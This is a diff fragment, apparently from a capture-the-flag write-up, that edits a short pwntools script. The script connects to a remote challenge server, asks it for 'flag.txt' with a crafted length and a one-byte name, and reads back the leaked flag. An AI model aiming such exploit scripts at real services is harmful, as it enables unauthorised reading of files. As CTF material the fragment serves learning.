@@ -280,9 +280,9 @@ Ok let's try out our concept:
 #!usr/bin/env python
 from pwn import *
 r = remote("34.87.186.254",21235)
-r.sendlineafter(b'> ',b'flag.txt')
-r.sendlineafter(b'Length: ',b'100')
-r.sendafter(b'Name: ',b'a'*1)
+r.sendlineafter("> ", "flag.txt")
+r.sendlineafter("Length: ", "100")
+r.sendafter("Name: ", b'a'*1)
 r.recvuntil("Goodbye a")
 print("Flag: g"+r.recvline())
 ```
